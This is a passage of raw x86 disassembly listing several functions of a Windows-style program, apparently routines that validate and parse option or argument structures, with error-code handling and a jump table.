  40c569:	xor    eax,ebp
  40c56b:	mov    DWORD PTR [ebp-0x8],eax
  40c56e:	fldz   
  40c570:	and    DWORD PTR [ebp-0x20],0x0
  40c574:	push   ebx
  40c575:	push   esi
  40c576:	fstp   DWORD PTR [ebp-0x14]
  40c579:	fldz   
  40c57b:	mov    ebx,edx
  40c57d:	xor    edx,edx
  40c57f:	mov    esi,ecx
  40c581:	push   edi
  40c582:	push   edx
  40c583:	fstp   QWORD PTR [ebp-0x3c]
  40c586:	mov    DWORD PTR [ebp-0x28],edx
  40c589:	call   DWORD PTR ds:0x412014
  40c58f:	mov    eax,DWORD PTR [ebp+0x8]
  40c592:	test   eax,eax
  40c594:	je     0x40c64c
  40c59a:	mov    edx,DWORD PTR [eax+0xc]
  40c59d:	mov    eax,DWORD PTR [eax+0x8]
  40c5a0:	mov    DWORD PTR [ebp-0x1c],edx
  40c5a3:	mov    DWORD PTR [ebp-0x10],eax
  40c5a6:	test   edx,edx
  40c5a8:	je     0x40c64c
  40c5ae:	test   eax,eax
  40c5b0:	je     0x40c64c
  40c5b6:	mov    eax,DWORD PTR [edx+0x14]
  40c5b9:	mov    ecx,DWORD PTR [edx+0x2c]
  40c5bc:	mov    edi,DWORD PTR [edx+0x10]
  40c5bf:	mov    DWORD PTR [ebp-0x30],eax
  40c5c2:	mov    eax,DWORD PTR [edx+0x30]
  40c5c5:	mov    DWORD PTR [ebp-0x18],eax
  40c5c8:	mov    eax,DWORD PTR [edx+0x28]
  40c5cb:	mov    DWORD PTR [ebp-0x2c],eax
  40c5ce:	mov    eax,DWORD PTR [edx+0x8]
  40c5d1:	mov    DWORD PTR [ebp-0xc],ecx
  40c5d4:	mov    DWORD PTR [ebp-0x30],eax
  40c5d7:	cmp    eax,0xa
  40c5da:	je     0x40c63d
  40c5dc:	test   ebx,ebx
  40c5de:	jne    0x40c63d
  40c5e0:	mov    eax,edi
  40c5e2:	and    eax,0x10
  40c5e5:	or     eax,ebx
  40c5e7:	jne    0x40c63a
  40c5e9:	test   esi,esi
  40c5eb:	je     0x40c613
  40c5ed:	push   esi
  40c5ee:	call   DWORD PTR ds:0x4120c4
  40c5f4:	test   eax,eax
  40c5f6:	je     0x40c613
  40c5f8:	mov    ecx,0x15eb
  40c5fd:	push   DWORD PTR [ebp-0x10]
  40c600:	push   esi
  40c601:	call   0x4098dc
  40c606:	push   eax
  40c607:	push   0x2
  40c609:	call   0x40952c
  40c60e:	add    esp,0x10
  40c611:	jmp    0x40c62d
  40c613:	call   DWORD PTR ds:0x4120cc
  40c619:	test   eax,eax
  40c61b:	jne    0x40c628
  40c61d:	push   0x42b
  40c622:	call   DWORD PTR ds:0x412014
  40c628:	call   0x4095c0
  40c62d:	push   0x800401e4
  40c632:	call   DWORD PTR ds:0x412014
  40c638:	jmp    0x40c663
  40c63a:	mov    eax,DWORD PTR [edx+0x8]
  40c63d:	test   esi,esi
  40c63f:	jne    0x40c678
  40c641:	mov    eax,edi
  40c643:	and    eax,0x40000
  40c648:	or     eax,esi
  40c64a:	jne    0x40c685
  40c64c:	call   DWORD PTR ds:0x4120cc
  40c652:	test   eax,eax
  40c654:	jne    0x40c65e
  40c656:	push   0x57
  40c658:	call   DWORD PTR ds:0x412014
  40c65e:	call   0x4095c0
  40c663:	xor    eax,eax
  40c665:	mov    ecx,DWORD PTR [ebp-0x8]
  40c668:	pop    edi
  40c669:	pop    esi
  40c66a:	xor    ecx,ebp
  40c66c:	pop    ebx
  40c66d:	call   0x40e2c0
  40c672:	mov    esp,ebp
  40c674:	pop    ebp
  40c675:	ret    0x4
  40c678:	cmp    DWORD PTR [edx+0x24],0x0
  40c67c:	je     0x40c68b
  40c67e:	cmp    eax,0x9
  40c681:	je     0x40c68b
  40c683:	jmp    0x40c688
  40c685:	mov    eax,DWORD PTR [edx+0x8]
  40c688:	mov    esi,DWORD PTR [edx+0x24]
  40c68b:	dec    eax
  40c68c:	cmp    eax,0x9
  40c68f:	ja     0x40c64c
  40c691:	jmp    DWORD PTR [eax*4+0x40cae0]
  40c698:	test   ebx,ebx
  40c69a:	je     0x40c6e3
  40c69c:	mov    eax,edi
  40c69e:	and    eax,0x42
  40c6a1:	or     eax,0x0
  40c6a4:	je     0x40c6e3
  40c6a6:	push   0x0
  40c6a8:	push   0x0
  40c6aa:	push   0xa
  40c6ac:	mov    edx,ebx
  40c6ae:	pop    ecx
  40c6af:	call   0x409339
  40c6b4:	test   eax,eax
  40c6b6:	jne    0x40c6c6
  40c6b8:	call   DWORD PTR ds:0x4120cc
  40c6be:	test   eax,eax
  40c6c0:	jne    0x40c65e
  40c6c2:	push   0x8
  40c6c4:	jmp    0x40c658
  40c6c6:	push   ecx
  40c6c7:	mov    edx,0x401a90
  40c6cc:	mov    ecx,eax
  40c6ce:	call   0x409e43
  40c6d3:	mov    ebx,eax
  40c6d5:	call   DWORD PTR ds:0x4120cc
  40c6db:	test   eax,eax
  40c6dd:	jne    0x40c65e
  40c6e3:	mov    eax,edi
  40c6e5:	and    eax,0x2
  40c6e8:	or     eax,0x0
  40c6eb:	je     0x40c745
  40c6ed:	test   ebx,ebx
  40c6ef:	jne    0x40c6f9
  40c6f1:	xor    eax,eax
  40c6f3:	inc    eax
  40c6f4:	jmp    0x40c665
  40c6f9:	mov    edx,DWORD PTR [ebp-0x2c]
  40c6fc:	mov    ecx,ebx
  40c6fe:	push   0x1
  40c700:	call   0x409cb0
  40c705:	test   eax,eax
  40c707:	jne    0x40c745
  40c709:	test   esi,esi
  40c70b:	je     0x40c737
  40c70d:	push   esi
  40c70e:	call   DWORD PTR ds:0x4120c4
  40c714:	test   eax,eax
  40c716:	je     0x40c737
  40c718:	push   DWORD PTR [ebp-0x10]
  40c71b:	mov    ecx,0x15e1
  40c720:	push   esi
  40c721:	push   ebx
  40c722:	call   0x4098dc
  40c727:	push   eax
  40c728:	push   0x3
  40c72a:	call   0x40952c
  40c72f:	add    esp,0x14
  40c732:	jmp    0x40c62d
  40c737:	push   DWORD PTR [ebp-0x10]
  40c73a:	mov    ecx,0x15ec
  40c73f:	push   ebx
  40c740:	jmp    0x40c601
  40c745:	test   ebx,ebx
  40c747:	je     0x40c6f1
  40c749:	mov    eax,edi
  40c74b:	and    eax,0x80
  40c750:	or     eax,0x0
  40c753:	je     0x40c796
  40c755:	push   ebx
  40c756:	call   DWORD PTR ds:0x4120c4
  40c75c:	test   eax,eax
  40c75e:	jne    0x40c796
  40c760:	test   esi,esi
  40c762:	je     0x40c779
  40c764:	push   esi
  40c765:	call   DWORD PTR ds:0x4120c4
  40c76b:	test   eax,eax
  40c76d:	je     0x40c779
  40c76f:	mov    ecx,0x15ee
  40c774:	jmp    0x40c5fd
  40c779:	mov    ecx,0x15ef
  40c77e:	push   DWORD PTR [ebp-0x10]
  40c781:	call   0x4098dc
  40c786:	push   eax
  40c787:	push   0x1
  40c789:	call   0x40952c
  40c78e:	add    esp,0xc
  40c791:	jmp    0x40c62d
  40c796:	mov    eax,edi
  40c798:	and    eax,0x1
  40c79b:	or     eax,0x0
  40c79e:	je     0x40c7e4
  40c7a0:	mov    ecx,DWORD PTR [ebp-0x1c]
  40c7a3:	mov    esi,DWORD PTR [ebp-0xc]
  40c7a6:	mov    eax,DWORD PTR [ecx+0x10]
  40c7a9:	and    eax,0x4000
  40c7ae:	or     eax,0x0
  40c7b1:	je     0x40c7cc
  40c7b3:	push   ecx
  40c7b4:	mov    ecx,DWORD PTR [esi]
  40c7b6:	mov    edx,0x20000
  40c7bb:	push   0x1
  40c7bd:	push   ebx
  40c7be:	call   0x40b046
  40c7c3:	cmp    eax,0xffffffff
  40c7c6:	jne    0x40c6f1
  40c7cc:	push   ecx
  40c7cd:	mov    ecx,DWORD PTR [esi]
  40c7cf:	mov    edx,ebx
  40c7d1:	call   0x40b1ba
  40c7d6:	cmp    eax,0xffffffff
  40c7d9:	jne    0x40c6f1
  40c7df:	jmp    0x40c6b8
  40c7e4:	cmp    DWORD PTR [ebp-0x18],0x0
  40c7e8:	je     0x40c825
  40c7ea:	push   ebx
  40c7eb:	call   DWORD PTR ds:0x4120c4
  40c7f1:	mov    ecx,DWORD PTR [ebp-0x18]
  40c7f4:	cmp    eax,ecx
  40c7f6:	jl     0x40c828
  40c7f8:	test   esi,esi
  40c7fa:	je     0x40c816
  40c7fc:	push   esi
  40c7fd:	call   DWORD PTR ds:0x4120c4
  40c803:	test   eax,eax
  40c805:	je     0x40c816
  40c807:	mov    eax,DWORD PTR [ebp-0x18]
  40c80a:	mov    ecx,0x15f4
  40c80f:	dec    eax
  40c810:	push   eax
  40c811:	jmp    0x40c600
  40c816:	mov    eax,DWORD PTR [ebp-0x18]
  40c819:	mov    ecx,0x15f2
  40c81e:	dec    eax
  40c81f:	push   eax
  40c820:	jmp    0x40c781
  40c825:	mov    ecx,DWORD PTR [ebp-0x18]
  40c828:	and    edi,0x10000
  40c82e:	or     edi,0x0
  40c831:	je     0x40c859
  40c833:	push   ebx
  40c834:	call   DWORD PTR ds:0x4120c4
  40c83a:	inc    eax
  40c83b:	mov    DWORD PTR [ebp-0x18],eax
  40c83e:	lea    ecx,[eax+eax*1]
  40c841:	call   0x40ab1d
  40c846:	test   eax,eax
  40c848:	je     0x40c6b8
  40c84e:	mov    ecx,DWORD PTR [ebp-0x1c]
  40c851:	mov    DWORD PTR [ecx+0x2c],eax
  40c854:	mov    ecx,DWORD PTR [ebp-0x18]
  40c857:	jmp    0x40c85c
  40c859:	mov    eax,DWORD PTR [ebp-0xc]
  40c85c:	push   ecx
  40c85d:	mov    edx,ebx
  40c85f:	mov    ecx,eax
  40c861:	call   0x40a26c
  40c866:	jmp    0x40c6f1
  40c86b:	xor    eax,eax
  40c86d:	cmp    DWORD PTR [ebp-0x30],0x2
  40c871:	sete   al
  40c874:	mov    DWORD PTR [ebp-0x14],eax
  40c877:	test   ebx,ebx
  40c879:	je     0x40c6f1
  40c87f:	mov    ecx,ebx
  40c881:	call   0x40a30b
  40c886:	test   eax,eax
  40c888:	je     0x40c943
  40c88e:	push   DWORD PTR [ebp-0x14]
  40c891:	mov    ecx,ebx
  40c893:	call   0x409ba8
  40c898:	test   eax,eax
  40c89a:	je     0x40c943
  40c8a0:	mov    esi,DWORD PTR [ebp-0x14]
  40c8a3:	mov    ecx,ebx
  40c8a5:	call   0x409aea
  40c8aa:	cmp    esi,0x1
  40c8ad:	jne    0x40c8b6
  40c8af:	mov    edx,DWORD PTR [ebp-0x28]
  40c8b2:	mov    ebx,eax
  40c8b4:	jmp    0x40c8be
  40c8b6:	mov    ebx,DWORD PTR [ebp-0x20]
  40c8b9:	mov    edx,eax
  40c8bb:	mov    DWORD PTR [ebp-0x28],edx
  40c8be:	and    edi,0x1
  40c8c1:	or     edi,0x0
  40c8c4:	je     0x40c92d
  40c8c6:	mov    ecx,DWORD PTR [ebp-0x1c]
  40c8c9:	mov    eax,DWORD PTR [ecx+0x10]
  40c8cc:	xor    ecx,ecx
  40c8ce:	and    eax,0x4000
  40c8d3:	or     eax,ecx
  40c8d5:	je     0x40c909
  40c8d7:	push   ecx
  40c8d8:	cmp    esi,0x1
  40c8db:	lea    eax,[ebp-0x20]
  40c8de:	mov    esi,DWORD PTR [ebp-0xc]
  40c8e1:	push   ecx
  40c8e2:	push   eax
  40c8e3:	mov    ecx,DWORD PTR [esi]
  40c8e5:	jne    0x40c8f1
  40c8e7:	mov    DWORD PTR [ebp-0x20],ebx
  40c8ea:	mov    edx,0x30000
  40c8ef:	jmp    0x40c8f9
  40c8f1:	mov    DWORD PTR [ebp-0x20],edx
  40c8f4:	mov    edx,0x40000
  40c8f9:	call   0x40b046
  40c8fe:	cmp    eax,0xffffffff
  40c901:	jne    0x40c6f1
  40c907:	jmp    0x40c90c
  40c909:	mov    esi,DWORD PTR [ebp-0xc]
  40c90c:	cmp    DWORD PTR [ebp-0x14],0x1
  40c910:	mov    ecx,DWORD PTR [esi]
  40c912:	jne    0x40c920
  40c914:	mov    edx,ebx
  40c916:	call   0x40b22c
  40c91b:	jmp    0x40c7d6
  40c920:	mov    edx,DWORD PTR [ebp-0x28]
  40c923:	call   0x40b27c
  40c928:	jmp    0x40c7d6
  40c92d:	cmp    esi,0x1
  40c930:	mov    esi,DWORD PTR [ebp-0xc]
  40c933:	jne    0x40c93c
  40c935:	mov    DWORD PTR [esi],ebx
  40c937:	jmp    0x40c6f1
  40c93c:	mov    DWORD PTR [esi],edx
  40c93e:	jmp    0x40c6f1
  40c943:	and    edi,0x10
  40c946:	or     edi,0x0
  40c949:	je     0x40c95e
  40c94b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c94e:	cmp    DWORD PTR [ecx+0x4],0xffffffff
  40c952:	je     0x40c95e
  40c954:	xor    eax,eax
  40c956:	inc    eax
  40c957:	mov    DWORD PTR [ecx],eax
  40c959:	jmp    0x40c665
  40c95e:	test   esi,esi
  40c960:	je     0x40c977
  40c962:	push   esi
  40c963:	call   DWORD PTR ds:0x4120c4
  40c969:	test   eax,eax
  40c96b:	je     0x40c977
  40c96d:	mov    ecx,0x15e2
  40c972:	jmp    0x40c5fd
  40c977:	mov    ecx,0x15f0
  40c97c:	jmp    0x40c77e
  40c981:	test   ebx,ebx
  40c983:	je     0x40c6f1
  40c989:	mov    ecx,ebx
  40c98b:	call   0x409a4c
  40c990:	fstp   st(0)
  40c992:	call   DWORD PTR ds:0x4120cc
  40c998:	test   eax,eax
  40c99a:	je     0x40c9d0
  40c99c:	and    edi,0x10
  40c99f:	or     edi,0x0
  40c9a2:	je     0x40c9ad
  40c9a4:	mov    ecx,DWORD PTR [ebp+0x8]
  40c9a7:	cmp    DWORD PTR [ecx+0x4],0xffffffff
  40c9ab:	jne    0x40c954
  40c9ad:	test   esi,esi
  40c9af:	je     0x40c9c6
  40c9b1:	push   esi
  40c9b2:	call   DWORD PTR ds:0x4120c4
  40c9b8:	test   eax,eax
  40c9ba:	je     0x40c9c6
  40c9bc:	mov    ecx,0x15e3
  40c9c1:	jmp    0x40c5fd
  40c9c6:	mov    ecx,0x15f1
  40c9cb:	jmp    0x40c77e
  40c9d0:	mov    esi,DWORD PTR [ebp-0x1c]
  40c9d3:	mov    ecx,ebx
  40c9d5:	cmp    DWORD PTR [esi+0x8],0x7
  40c9d9:	jne    0x40c9e7
  40c9db:	call   0x409a4c
  40c9e0:	fstp   DWORD PTR [ebp-0x14]
  40c9e3:	fldz   
  40c9e5:	jmp    0x40c9ef
  40c9e7:	call   0x409a4c
  40c9ec:	fst    QWORD PTR [ebp-0x3c]
  40c9ef:	and    edi,0x1
  40c9f2:	xor    ecx,ecx
  40c9f4:	or     edi,ecx
  40c9f6:	je     0x40ca77
  40c9f8:	mov    eax,DWORD PTR [esi+0x10]
  40c9fb:	fld    DWORD PTR [ebp-0x14]
  40c9fe:	and    eax,0x4000
  40ca03:	or     eax,ecx
  40ca05:	je     0x40ca44
  40ca07:	cmp    DWORD PTR [esi+0x8],0x7
  40ca0b:	mov    esi,DWORD PTR [ebp-0xc]
  40ca0e:	push   ecx
  40ca0f:	push   ecx
  40ca10:	mov    ecx,DWORD PTR [esi]
  40ca12:	jne    0x40ca23
  40ca14:	fstp   st(1)
  40ca16:	lea    eax,[ebp-0x20]
  40ca19:	fstp   DWORD PTR [ebp-0x20]
  40ca1c:	mov    edx,0x60000
  40ca21:	jmp    0x40ca30
  40ca23:	fstp   st(0)
  40ca25:	lea    eax,[ebp-0x24]
  40ca28:	fstp   QWORD PTR [ebp-0x24]
  40ca2b:	mov    edx,0x70000
  40ca30:	push   eax
  40ca31:	call   0x40b046
  40ca36:	cmp    eax,0xffffffff
  40ca39:	jne    0x40c6f1
  40ca3f:	fld    DWORD PTR [ebp-0x14]
  40ca42:	jmp    0x40ca49
  40ca44:	mov    esi,DWORD PTR [ebp-0xc]
  40ca47:	fstp   st(1)
  40ca49:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ca4c:	push   ecx
  40ca4d:	cmp    DWORD PTR [ecx+0x8],0x7
  40ca51:	jne    0x40ca62
  40ca53:	mov    ecx,DWORD PTR [esi]
  40ca55:	fstp   DWORD PTR [esp]
  40ca58:	call   0x40b2cc
  40ca5d:	jmp    0x40c7d6
  40ca62:	fstp   st(0)
  40ca64:	fld    QWORD PTR [ebp-0x3c]
  40ca67:	push   ecx
  40ca68:	mov    ecx,DWORD PTR [esi]
  40ca6a:	fstp   QWORD PTR [esp]
  40ca6d:	call   0x40b31d
  40ca72:	jmp    0x40c7d6
  40ca77:	cmp    DWORD PTR [esi+0x8],0x7
  40ca7b:	mov    esi,DWORD PTR [ebp-0xc]
  40ca7e:	jne    0x40ca8c
  40ca80:	fstp   st(0)
  40ca82:	fld    DWORD PTR [ebp-0x14]
  40ca85:	fstp   DWORD PTR [esi]
  40ca87:	jmp    0x40c6f1
  40ca8c:	fstp   QWORD PTR [esi]
  40ca8e:	jmp    0x40c6f1
  40ca93:	mov    ecx,DWORD PTR [ebp+0x8]
  40ca96:	push   ecx
  40ca97:	push   DWORD PTR [edx+0x38]
  40ca9a:	push   ebx
  40ca9b:	push   esi
  40ca9c:	mov    esi,DWORD PTR [edx+0x34]
  40ca9f:	mov    ecx,esi
  40caa1:	call   DWORD PTR ds:0x41228c
  40caa7:	call   esi
  40caa9:	jmp    0x40c665
  40caae:	test   ebx,ebx
  40cab0:	je     0x40cad3
  40cab2:	test   esi,esi
  40cab4:	je     0x40c613
  40caba:	push   esi
  40cabb:	call   DWORD PTR ds:0x4120c4
  40cac1:	test   eax,eax
  40cac3:	je     0x40c613
  40cac9:	mov    ecx,0x15f3
  40cace:	jmp    0x40c5fd
  40cad3:	mov    DWORD PTR [ecx],0x1
  40cad9:	jmp    0x40c6f1
  40cade:	mov    edi,edi
  40cae0:	cwde   
  40cae1:	mov    BYTE PTR [eax+0x0],0x6b
  40cae5:	enter  0x40,0x6b
  40cae9:	enter  0x40,0xf1
  40caed:	mov    BYTE PTR [eax+0x0],0xf1
  40caf1:	mov    BYTE PTR [eax+0x0],0xf1
  40caf5:	mov    BYTE PTR [eax+0x0],0x81
  40caf9:	leave  
  40cafa:	inc    eax
  40cafb:	add    BYTE PTR [ecx-0x6cffbf37],al
  40cb01:	retf   0x40
  40cb04:	scas   al,BYTE PTR es:[edi]
  40cb05:	retf   0x40
  40cb08:	int3   
  40cb09:	int3   
  40cb0a:	int3   
  40cb0b:	int3   
  40cb0c:	int3   
  40cb0d:	mov    edi,edi
  40cb0f:	push   ebp
  40cb10:	mov    ebp,esp
  40cb12:	push   ecx
  40cb13:	push   ebx
  40cb14:	push   esi
  40cb15:	push   edi
  40cb16:	push   0x0
  40cb18:	mov    esi,edx
  40cb1a:	call   DWORD PTR ds:0x412014
  40cb20:	test   esi,esi
  40cb22:	je     0x40cbbe
  40cb28:	mov    ebx,DWORD PTR [ebp+0x8]
  40cb2b:	test   ebx,ebx
  40cb2d:	je     0x40cbbe
  40cb33:	mov    ecx,ebx
  40cb35:	call   0x40bedf
  40cb3a:	test   eax,eax
  40cb3c:	jne    0x40cb48
  40cb3e:	push   0x490
  40cb43:	jmp    0x40cbca
  40cb48:	xor    edi,edi
  40cb4a:	add    esi,0x20
  40cb4d:	lea    eax,[esi-0x20]
  40cb50:	test   eax,eax
  40cb52:	je     0x40cba0
  40cb54:	mov    eax,DWORD PTR [esi-0x10]
  40cb57:	and    eax,0x100000
  40cb5c:	or     eax,0x0
  40cb5f:	je     0x40cb67
  40cb61:	and    DWORD PTR [ebp-0x4],0x0
  40cb65:	jmp    0x40cb6e
  40cb67:	mov    DWORD PTR [ebp-0x4],0x1
  40cb6e:	cmp    DWORD PTR [esi],0x0
  40cb71:	je     0x40cb91
  40cb73:	push   DWORD PTR [esi]
  40cb75:	call   DWORD PTR ds:0x4120c4
  40cb7b:	test   eax,eax
  40cb7d:	jle    0x40cb91
  40cb7f:	push   DWORD PTR [ebp-0x4]
  40cb82:	mov    edx,DWORD PTR [esi]
  40cb84:	lea    ecx,[ebx+0x2]
  40cb87:	call   0x409cb0
  40cb8c:	cmp    eax,0x1
  40cb8f:	je     0x40cb9c
  40cb91:	inc    edi
  40cb92:	add    esi,0x50
  40cb95:	cmp    edi,0x6
  40cb98:	jb     0x40cb4d
  40cb9a:	jmp    0x40cb3e
  40cb9c:	mov    eax,edi
  40cb9e:	jmp    0x40cbd3
  40cba0:	call   DWORD PTR ds:0x4120cc
  40cba6:	test   eax,eax
  40cba8:	jne    0x40cbb5
  40cbaa:	push   0x42b
  40cbaf:	call   DWORD PTR ds:0x412014
  40cbb5:	call   0x4095c0
  40cbba:	xor    eax,eax
  40cbbc:	jmp    0x40cbd3
  40cbbe:	call   DWORD PTR ds:0x4120cc
  40cbc4:	test   eax,eax
  40cbc6:	jne    0x40cbd0
  40cbc8:	push   0x57
  40cbca:	call   DWORD PTR ds:0x412014
  40cbd0:	or     eax,0xffffffff
  40cbd3:	pop    edi
  40cbd4:	pop    esi
  40cbd5:	pop    ebx
  40cbd6:	mov    esp,ebp
  40cbd8:	pop    ebp
  40cbd9:	ret    0x4
  40cbdc:	int3   
  40cbdd:	int3   
  40cbde:	int3   
  40cbdf:	int3   
  40cbe0:	int3   
  40cbe1:	mov    edi,edi
  40cbe3:	push   ebp
  40cbe4:	mov    ebp,esp
  40cbe6:	push   ecx
  40cbe7:	push   ecx
  40cbe8:	push   ebx
  40cbe9:	push   esi
  40cbea:	push   edi
  40cbeb:	mov    ebx,edx
  40cbed:	push   0x0
  40cbef:	mov    DWORD PTR [ebp-0x8],ebx
  40cbf2:	call   DWORD PTR ds:0x412014
  40cbf8:	test   ebx,ebx
  40cbfa:	je     0x40ccaf
  40cc00:	mov    edi,DWORD PTR [ebp+0x8]
  40cc03:	test   edi,edi
  40cc05:	je     0x40ccaf
  40cc0b:	mov    esi,DWORD PTR [ebp+0xc]
  40cc0e:	test   esi,esi
  40cc10:	je     0x40ccaf
  40cc16:	and    DWORD PTR [esi],0x0
  40cc19:	and    DWORD PTR [esi+0x4],0x0
  40cc1d:	push   ecx
  40cc1e:	push   ecx
  40cc1f:	push   0x3a
  40cc21:	pop    edx
  40cc22:	mov    ecx,edi
  40cc24:	call   0x409c63
  40cc29:	mov    ebx,eax
  40cc2b:	cmp    ebx,0xffffffff
  40cc2e:	je     0x40ccc1
  40cc34:	push   edi
  40cc35:	call   DWORD PTR ds:0x4120c4
  40cc3b:	push   0x1
  40cc3d:	lea    ecx,[ebx+0x5]
  40cc40:	sub    eax,ebx
  40cc42:	push   ecx
  40cc43:	push   0x8
  40cc45:	dec    eax
  40cc46:	xor    edx,edx
  40cc48:	pop    ecx
  40cc49:	mov    DWORD PTR [ebp-0x4],eax
  40cc4c:	call   0x409339
  40cc51:	mov    DWORD PTR [esi],eax
  40cc53:	test   eax,eax
  40cc55:	jne    0x40cc65
  40cc57:	call   DWORD PTR ds:0x4120cc
  40cc5d:	test   eax,eax
  40cc5f:	jne    0x40ccc1
  40cc61:	push   0x8
  40cc63:	jmp    0x40ccbb
  40cc65:	mov    eax,DWORD PTR [ebp-0x4]
  40cc68:	xor    edx,edx
  40cc6a:	push   0x1
  40cc6c:	add    eax,0x5
  40cc6f:	push   eax
  40cc70:	push   0x9
  40cc72:	pop    ecx
  40cc73:	call   0x409339
  40cc78:	mov    DWORD PTR [esi+0x4],eax
  40cc7b:	test   eax,eax
  40cc7d:	je     0x40cc57
  40cc7f:	mov    ecx,DWORD PTR [esi]
  40cc81:	lea    eax,[ebx+0x1]
  40cc84:	push   eax
  40cc85:	mov    edx,edi
  40cc87:	call   0x40a26c
  40cc8c:	mov    eax,DWORD PTR [ebp-0x4]
  40cc8f:	test   eax,eax
  40cc91:	je     0x40cca3
  40cc93:	mov    ecx,DWORD PTR [esi+0x4]
  40cc96:	lea    edx,[edi+0x2]
  40cc99:	inc    eax
  40cc9a:	lea    edx,[edx+ebx*2]
  40cc9d:	push   eax
  40cc9e:	call   0x40a26c
  40cca3:	push   DWORD PTR [esi]
  40cca5:	mov    edx,DWORD PTR [ebp-0x8]
  40cca8:	call   0x40cb0d
  40ccad:	jmp    0x40ccc4
  40ccaf:	call   DWORD PTR ds:0x4120cc
  40ccb5:	test   eax,eax
  40ccb7:	jne    0x40ccc1
  40ccb9:	push   0x57
  40ccbb:	call   DWORD PTR ds:0x412014
  40ccc1:	or     eax,0xffffffff
  40ccc4:	pop    edi
  40ccc5:	pop    esi
  40ccc6:	pop    ebx
  40ccc7:	mov    esp,ebp
  40ccc9:	pop    ebp
  40ccca:	ret    0x8
  40cccd:	int3   
  40ccce:	int3   
  40cccf:	int3   
  40ccd0:	int3   
  40ccd1:	int3   
  40ccd2:	mov    edi,edi
  40ccd4:	push   ebp
  40ccd5:	mov    ebp,esp
  40ccd7:	push   ecx
  40ccd8:	push   esi
  40ccd9:	mov    esi,edx
  40ccdb:	push   edi
  40ccdc:	test   esi,esi
  40ccde:	je     0x40cd4e
  40cce0:	call   DWORD PTR ds:0x4120cc
  40cce6:	mov    DWORD PTR [ebp-0x4],eax
  40cce9:	call   0x4094a3
  40ccee:	test   eax,eax
  40ccf0:	jne    0x40ccfc
  40ccf2:	push   0x7
  40ccf4:	pop    ecx
  40ccf5:	call   0x4092df
  40ccfa:	jmp    0x40cd0a
  40ccfc:	push   0x0
  40ccfe:	push   0x0
  40cd00:	push   0x7
  40cd02:	mov    edx,eax
  40cd04:	pop    ecx
  40cd05:	call   0x409339
  40cd0a:	mov    edi,eax
  40cd0c:	test   edi,edi
  40cd0e:	je     0x40cd4e
  40cd10:	push   ebx
  40cd11:	push   0x6
  40cd13:	add    esi,0x2c
  40cd16:	pop    ebx
  40cd17:	cmp    DWORD PTR [esi],0x0
  40cd1a:	je     0x40cd30
  40cd1c:	mov    eax,DWORD PTR [esi-0x1c]
  40cd1f:	and    eax,0x10000
  40cd24:	or     eax,0x0
  40cd27:	je     0x40cd30
  40cd29:	mov    ecx,esi
  40cd2b:	call   0x40aa69
  40cd30:	add    esi,0x50
  40cd33:	sub    ebx,0x1
  40cd36:	jne    0x40cd17
  40cd38:	mov    ecx,edi
  40cd3a:	call   0x4094c8
  40cd3f:	push   DWORD PTR [ebp-0x4]
  40cd42:	call   DWORD PTR ds:0x412014
  40cd48:	xor    eax,eax
  40cd4a:	inc    eax
  40cd4b:	pop    ebx
  40cd4c:	jmp    0x40cd50
  40cd4e:	xor    eax,eax
  40cd50:	pop    edi
  40cd51:	pop    esi
  40cd52:	mov    esp,ebp
  40cd54:	pop    ebp
  40cd55:	ret    
  40cd56:	int3   
  40cd57:	int3   
  40cd58:	int3   
  40cd59:	int3   
  40cd5a:	int3   
  40cd5b:	int3   
  40cd5c:	int3   
  40cd5d:	mov    edi,edi
  40cd5f:	push   ebp
  40cd60:	mov    ebp,esp
  40cd62:	sub    esp,0x3c
  40cd65:	and    DWORD PTR [ebp-0x10],0x0
  40cd69:	push   ebx
  40cd6a:	push   esi
  40cd6b:	push   edi
  40cd6c:	mov    ebx,edx
  40cd6e:	mov    edi,ecx
  40cd70:	push   0x0
  40cd72:	mov    DWORD PTR [ebp-0x20],ebx
  40cd75:	mov    DWORD PTR [ebp-0x1c],edi
  40cd78:	call   DWORD PTR ds:0x412014
  40cd7e:	test   edi,edi
  40cd80:	je     0x40d070
  40cd86:	test   ebx,ebx
  40cd88:	je     0x40d070
  40cd8e:	mov    esi,DWORD PTR [ebp+0x10]
  40cd91:	test   esi,esi
  40cd93:	je     0x40d070
  40cd99:	call   0x409839
  40cd9e:	test   eax,eax
  40cda0:	jne    0x40cdc3
  40cda2:	mov    ecx,0x157f
  40cda7:	call   0x4098dc
  40cdac:	mov    ecx,eax
  40cdae:	call   0x4094c8
  40cdb3:	push   0x47e
  40cdb8:	call   DWORD PTR ds:0x412014
  40cdbe:	jmp    0x40d07d
  40cdc3:	call   0x40920b
  40cdc8:	test   eax,eax
  40cdca:	je     0x40d078
  40cdd0:	xor    ecx,ecx
  40cdd2:	call   0x40bf30
  40cdd7:	mov    ebx,eax
  40cdd9:	mov    DWORD PTR [ebp-0xc],ebx
  40cddc:	test   ebx,ebx
  40cdde:	je     0x40d078
  40cde4:	push   esi
  40cde5:	lea    ecx,[ebp-0x10]
  40cde8:	call   0x40c26b
  40cded:	test   eax,eax
  40cdef:	je     0x40d078
  40cdf5:	and    DWORD PTR [ebp-0x14],0x0
  40cdf9:	xor    ecx,ecx
  40cdfb:	inc    ecx
  40cdfc:	mov    DWORD PTR [ebp-0x18],ecx
  40cdff:	cmp    edi,ecx
  40ce01:	jbe    0x40cfb9
  40ce07:	mov    edx,DWORD PTR [ebp-0x20]
  40ce0a:	push   0x2
  40ce0c:	pop    eax
  40ce0d:	mov    DWORD PTR [ebp-0x8],eax
  40ce10:	lea    eax,[ecx+0x1]
  40ce13:	mov    edi,DWORD PTR [edx+ecx*4]
  40ce16:	cmp    eax,DWORD PTR [ebp-0x1c]
  40ce19:	jae    0x40ce24
  40ce1b:	mov    ebx,DWORD PTR [edx+ecx*4+0x4]
  40ce1f:	mov    DWORD PTR [ebp-0x4],ebx
  40ce22:	jmp    0x40ce28
  40ce24:	and    DWORD PTR [ebp-0x4],0x0
  40ce28:	push   edi
  40ce29:	mov    edx,esi
  40ce2b:	call   0x40cb0d
  40ce30:	mov    ecx,eax
  40ce32:	cmp    ecx,0xffffffff
  40ce35:	jne    0x40ce6f
  40ce37:	lea    eax,[ebp-0x28]
  40ce3a:	mov    edx,esi
  40ce3c:	push   eax
  40ce3d:	push   edi
  40ce3e:	call   0x40cbe1
  40ce43:	mov    ecx,eax
  40ce45:	cmp    ecx,0xffffffff
  40ce48:	jne    0x40ce5e
  40ce4a:	mov    eax,DWORD PTR [ebp-0x10]
  40ce4d:	cmp    eax,ecx
